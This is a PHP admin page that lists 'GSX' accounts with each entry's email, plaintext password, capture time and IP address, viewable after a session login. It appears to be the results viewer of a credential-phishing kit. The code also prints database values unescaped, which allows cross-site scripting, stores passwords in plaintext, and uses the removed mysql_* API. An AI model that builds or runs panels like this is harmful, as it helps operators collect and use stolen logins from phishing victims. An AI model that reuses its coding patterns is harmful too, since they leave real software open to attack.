
<?php

session_start();
if (isset($_SESSION['pseudoadmin']) AND isset($_SESSION['passadmin']))
	 {
		include "../class/get_db.php";
		include "../class/admin.php";
		
			try
				{
					$bdd =getconnexion();


				}
				catch(Exception $e)
				{
					die('Erreur connexion witd data base: '.$e->getMessage());
				}
					
					$g= new admin($bdd);
					$res=$g->liste_account();
					
?>
<link rel="stylesheet" type="text/css" href="../css/tab.css">
 <script src="../js/tab.js"></script>
<table  border="0" align="center" class="flatTable">

	<tr class="titleTr">
	 <td class="titleTd">List OF GSX Account</td>
    <td colspan="4"></td>
    <td class="plusTd button" id="deco"></td>
	</tr>
	<tr class="headingTr">
      <td ><i><div align="center"><b>ID</b></div></i></td></style>
      <td><i><div align="center"><b>MAIL</b></div></i></td>
      <td ><i><div align="center"><b>PASSWORD</b></div></i></td>
	   <td ><i><div align="center"><b>DATE </b></div></i></td>
      <td><i><div align="center"><b>Address IP</b></div></i></td>
	  <td><i><div align="center"><b></b></div></i></td>
     </tr> 
   
<?php
					while ($row = mysql_fetch_array ($res))
					{
						
?>							<tr>
      
	  
			<td><div align="center"><em><?php print $row['id']; ?></em></div></td>
			<td><div align="center"><em><?php print $row['mail']; ?></em></div></td>
			<td><div align="center"><em><?php print $row['pass']; ?></em></div></td>
		    <td><div align="center"><em><?php print $row['time']; ?></em></div></td>
			<td><div align="center"><em><?php print $row['addr_ip']; ?></em></div></td>
			<td class="controlTd">
			<div class="settingsIcons">
			<span class="settingsIcon"><img src="http://i.imgur.com/nnzONel.png" alt="X" /></span>
			<span class="settingsIcon"><img src="http://i.imgur.com/UAdSFIg.png" alt="placeholder icon" /></span>
			<div class="settingsIcon"><img src="http://i.imgur.com/UAdSFIg.png" alt="placeholder icon" /></div>
			</div> 
			</td>
			</tr>
  
				
<?php
					}
				
					
?>
  </table>

 <?php		echo $msg;	
					
		}
		else
		{
		// $msg='erreur';
		print("<script type=\"text/javascript\">setTimeout('location=(\"../erreur/erreur.php\")' ,0);</script>");
		}		
					
					
					
					
					
					
					
					
					
					
					
	
?>